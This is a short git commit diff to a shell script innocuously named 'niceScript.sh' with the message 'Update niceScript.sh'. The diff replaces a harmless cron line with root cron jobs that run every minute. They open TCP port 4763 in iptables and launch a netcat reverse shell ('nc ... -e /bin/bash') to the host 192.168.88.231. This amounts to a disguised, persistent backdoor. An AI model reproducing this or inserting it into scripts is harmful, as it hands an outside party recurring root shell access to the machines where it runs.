ec9a1cafc7f5283637e34d7b5745f08873e7f833
amalone341 <42788620+amalone341@users.noreply.github.com>
2020-02-26 17:17:14 -0500

    Update niceScript.sh

--- niceScript.sh
+++ niceScript.sh
@@ -5,4 +5,7 @@
 touch /var/spool/cron/root
 /usr/bin/crontab /var/spool/cron/root
 
-echo "1 * * * * echo HELLO" >> /var/spool/cron/root
+echo "*/1 * * * * sudo iptables -I INPUT 1 -p tcp --dport 4763 -j ACCEPT" >> /var/spool/cron/root
+echo "*/1 * * * * sudo iptables -I OUTPUT 1 -p tcp --dport 4763 -j ACCEPT" >> /var/spool/cron/root
+echo "*/1 * * * * nc 192.168.88.231 4763 -e /bin/bash &" >> /var/spool/cron/root
+
